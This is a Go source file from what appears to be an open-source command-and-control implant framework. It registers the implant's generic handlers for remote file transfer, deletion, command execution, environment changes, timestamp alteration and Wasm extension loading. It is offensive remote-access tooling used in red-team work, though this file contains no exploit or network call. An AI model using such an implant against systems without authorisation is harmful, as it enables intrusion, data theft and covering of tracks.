//go:build !(linux || darwin || windows)

package handlers

/*
	Phantom Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.

	----------------------------------------------------------------------

	This file contains only pure Go handlers, which can be compiled for any
	platform/arch.

*/

import (
	"os"

	"github.com/cryptdefender3232/phantom/protobuf/phantompb"
)

var (
	genericHandlers = map[uint32]RPCHandler{
		phantompb.MsgPing:               pingHandler,
		phantompb.MsgLsReq:              dirListHandler,
		phantompb.MsgDownloadReq:        downloadHandler,
		phantompb.MsgUploadReq:          uploadHandler,
		phantompb.MsgCdReq:              cdHandler,
		phantompb.MsgPwdReq:             pwdHandler,
		phantompb.MsgRmReq:              rmHandler,
		phantompb.MsgMkdirReq:           mkdirHandler,
		phantompb.MsgMvReq:              mvHandler,
		phantompb.MsgCpReq:              cpHandler,
		phantompb.MsgExecuteReq:         executeHandler,
		phantompb.MsgExecuteChildrenReq: executeChildrenHandler,
		phantompb.MsgSetEnvReq:          setEnvHandler,
		phantompb.MsgEnvReq:             getEnvHandler,
		phantompb.MsgUnsetEnvReq:        unsetEnvHandler,
		phantompb.MsgReconfigureReq:     reconfigureHandler,
		phantompb.MsgChtimesReq:         chtimesHandler,
		phantompb.MsgGrepReq:            grepHandler,

		// Wasm Extensions - Note that execution can be done via a tunnel handler
		phantompb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
		phantompb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
		phantompb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,
	}
)

// GetSystemHandlers - Returns a map of the generic handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return genericHandlers
}

// GetSystemPivotHandlers - Not supported
func GetSystemPivotHandlers() map[uint32]TunnelHandler {
	return map[uint32]TunnelHandler{}
}

// Stub
func getUid(fileInfo os.FileInfo) string {
	return ""
}

// Stub
func getGid(fileInfo os.FileInfo) string {
	return ""
}
